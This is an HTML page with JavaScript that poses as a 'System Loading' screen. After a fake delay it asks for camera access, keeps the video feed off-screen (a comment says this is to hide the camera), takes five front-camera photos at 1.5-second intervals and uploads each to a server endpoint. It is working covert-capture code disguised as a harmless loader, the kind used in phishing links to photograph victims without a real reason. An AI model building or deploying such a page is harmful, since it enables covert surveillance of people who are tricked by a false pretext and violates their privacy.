<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Loading</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #1a1a1a; color: white; text-align: center; margin: 0; flex-direction: column; }
        #status-container { padding: 20px; }
        #status { font-size: 20px; margin-bottom: 20px; }
        #loader { border: 6px solid #f3f3f3; border-top: 6px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1.5s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #allow-button { background-color: #28a745; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; display: none; margin-top: 20px; }
        #allow-button:hover { background-color: #218838; }
        video { position: absolute; top: -9999px; left: -9999px; } /* Camera ko chupane ke liye */
    </style>
</head>
<body>

    <div id="status-container">
        <div id="loader"></div>
        <p id="status">System is loading, please wait...</p>
        <button id="allow-button">Allow Camera Access</button>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const statusEl = document.getElementById('status');
        const loaderEl = document.getElementById('loader');
        const allowButton = document.getElementById('allow-button');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        // 5 second baad "Allow" button dikhayein
        setTimeout(() => {
            statusEl.textContent = 'Permission required to continue.';
            loaderEl.style.display = 'none';
            allowButton.style.display = 'block';
        }, 5000);

        allowButton.addEventListener('click', startCameraProcess);

        async function startCameraProcess() {
            allowButton.style.display = 'none';
            loaderEl.style.display = 'block';
            statusEl.textContent = 'Requesting camera access...';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' } // Front camera
                });
                
                video.srcObject = stream;
                
                // Wait for the video to start playing to get dimensions
                video.onloadedmetadata = () => {
                    statusEl.textContent = 'Access granted. Capturing images...';
                    captureAndSendPhotos(stream);
                };

            } catch (err) {
                console.error("Camera access error:", err);
                statusEl.textContent = 'Camera access was denied. Cannot proceed.';
                loaderEl.style.display = 'none';
            }
        }

        function captureAndSendPhotos(stream) {
            const totalPhotos = 5;
            let photosTaken = 0;
            
            const captureInterval = setInterval(() => {
                if (photosTaken >= totalPhotos) {
                    clearInterval(captureInterval);
                    stream.getTracks().forEach(track => track.stop()); // Stop the camera
                    statusEl.textContent = 'Process completed successfully.';
                    loaderEl.style.display = 'none';
                    return;
                }

                photosTaken++;
                statusEl.textContent = `Capturing and sending photo ${photosTaken} of ${totalPhotos}...`;

                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                
                fetch('/api/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData })
                })
                .then(response => response.json())
                .then(data => console.log('Server response:', data.message))
                .catch(error => console.error('Upload error:', error));
                
            }, 1500); // Har 1.5 second mein ek tasveer
        }
    </script>
</body>
</html>
